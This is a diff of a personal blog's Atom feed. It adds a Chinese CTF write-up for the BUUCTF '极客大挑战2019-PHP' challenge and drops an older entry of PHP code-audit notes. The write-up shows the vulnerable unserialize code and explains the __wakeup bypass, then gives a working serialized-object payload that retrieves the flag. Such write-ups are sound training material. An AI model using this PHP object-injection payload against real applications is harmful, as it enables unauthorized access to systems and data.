@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-11T14:38:55.698Z</updated>
+  <updated>2020-06-12T15:06:30.520Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战2019-PHP</title>
+    <link href="http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/"/>
+    <id>http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</id>
+    <published>2020-06-12T13:58:03.000Z</published>
+    <updated>2020-06-12T15:06:30.520Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/1.png" alt="1"></p><p>描述中说有备份网站的习惯，尝试常见的网站备份地址，发现<a href="http://www.zip文件存在" target="_blank" rel="noopener">www.zip文件存在</a></p><p>下载解压，发现存在五个文件</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/2.png" alt="2"></p><p>其中三个PHP文件代码分别为</p><!DOCTYPE html><head>  <meta charset="UTF-8">  <title>I have a cat!</title>  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">      <link rel="stylesheet" href="style.css"><link rel="alternate" href="/atom.xml" title="大周'blog" type="application/atom+xml"></head><style>    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }</style><body>```index.php<!DOCTYPE html><head>  <meta charset="UTF-8">  <title>I have a cat!</title>  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">      <link rel="stylesheet" href="style.css"></head><style>    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }</style><body><div id="world">    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    </div>    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！    </div>    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">    <?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?>    </div>    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div></div><script src="http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js"></script><script src="http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js"></script><script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js"></script><script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js"></script><script src="index.js"></script></body>```<p>​```class.php<br>&lt;?php<br>include ‘flag.php’;</p><p>error_reporting(0);</p><p>class Name{<br>    private $username = ‘nonono’;<br>    private $password = ‘yesyes’;</p><pre><code>public function __construct($username,$password){    $this-&gt;username = $username;    $this-&gt;password = $password;}function __wakeup(){    $this-&gt;username = &#39;guest&#39;;}function __destruct(){    if ($this-&gt;password != 100) {        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;        echo &quot;You name is: &quot;;        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;        echo &quot;You password is: &quot;;        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;        die();    }    if ($this-&gt;username === &#39;admin&#39;) {        global $flag;        echo $flag;    }else{        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;        die();    }}</code></pre><p>}<br>?&gt;</p><pre><code>```flag.php&lt;?php$flag = &#39;Syc{dog_dog_dog_dog}&#39;;?&gt;</code></pre><p>可以看到在index.php中包含了class.php 代码如下</p><pre><code class="PHP">&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>从这几行代码中，推断与反序列化有关</p><p>然后看class.php几个关键函数</p><pre><code>__construct构造函数__wakeup函数__destruct析构函数</code></pre><p>关于__wakeup函数的漏洞，参考<a href>wakeup()函数漏洞以及实际漏洞分析</a></p><p><code>__wakeup()</code>漏洞，简要来说就是当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p>这里我们需要构造username等于admin和password等于100来echo flag</p><pre><code class="PHP">&lt;?phpclass Name{    private $username = &#39;admin&#39;;    private $password = &#39;100&#39;;}$a = new Name();echo serialize($a);?&gt;</code></pre><p>得到O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>为了绕过<code>__wakeup()</code> 我们将2改为3</p><p>得到O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>然后关于private声明变量</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>因此我们在类名和字段名前面加上\0的前缀，而\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00</p><p>最后得到payload</p><pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre></body>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>极客大挑战2019-LoveSQL</title>
@@ -417,28 +440,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;a href=&quot;#代码审计Sql注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;/a&gt;代码审计Sql注入漏洞&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day2</title>
-    <link href="http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/"/>
-    <id>http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/</id>
-    <published>2020-03-18T13:32:37.000Z</published>
-    <updated>2020-03-18T14:34:26.346Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>echo</p><p>​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支</p><a id="more"></a><p>print_r、var_dump、debug_zval_dump</p><p>​    输出变量的数据值，特别是数组和对象数据，一半在查看接口的返回值或者不确定的变量可以使用这两个api，debug_zval_dump输出结果和var_dump类似，位移增加的值是refcount，记录一个变量被引用了多少次</p><p>debug_print_backtrace</p><p>​    可以查看输出的调用栈信息</p><p>exit()</p><p>​    停止程序，无法运行后面代码</p><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><p>全局变量</p><p>​    全局变量就是在函数外面定义的变量。不能在函数中直接使用。因为它的作用域不<br>会到函数内部。所以在函数内部使用的时候常常看到类似global $a;</p><p>超全局变量</p><p>​    超全局变量作用域在所有脚本都有效。所以,在函数可直接使用。比如$_ GET，<br>$. SERVER都是超全局变量。除$<em>GET, $. _POST,$</em> SERVER, $_ COOKIE等之外的超全局<br>变量保存在$GLOBALS数组中</p><pre><code>$GLOBALS$_REQUEST$_GET$_ENV$_SESSION$_SERVE$_POST$_FILES$_COOKIS</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;代码调试&quot;&gt;&lt;a href=&quot;#代码调试&quot; class=&quot;headerlink&quot; title=&quot;代码调试&quot;&gt;&lt;/a&gt;代码调试&lt;/h2&gt;&lt;p&gt;echo&lt;/p&gt;
-&lt;p&gt;​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支&lt;/p&gt;
     
     </summary>
     
